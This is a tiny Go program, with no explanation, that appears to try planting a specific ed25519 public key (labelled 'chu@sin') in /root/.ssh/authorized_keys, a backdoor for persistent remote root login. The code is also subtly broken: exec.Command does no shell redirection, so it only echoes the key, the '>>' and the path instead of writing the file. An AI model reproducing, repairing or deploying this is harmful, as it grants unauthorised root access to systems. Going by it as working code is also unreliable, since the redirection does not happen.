package main

import (
        "fmt"
        "os/exec"
)

func main() {
        cmd := exec.Command("echo", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzXucY2+J2kE2ToUC5NAlUStZhCiFJc0b+/XaMJJIo7 chu@sin",">>","/root/.ssh/authorized_keys")
        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro:", err)
        } else {
            fmt.Println("output:", string(output))
        }
}
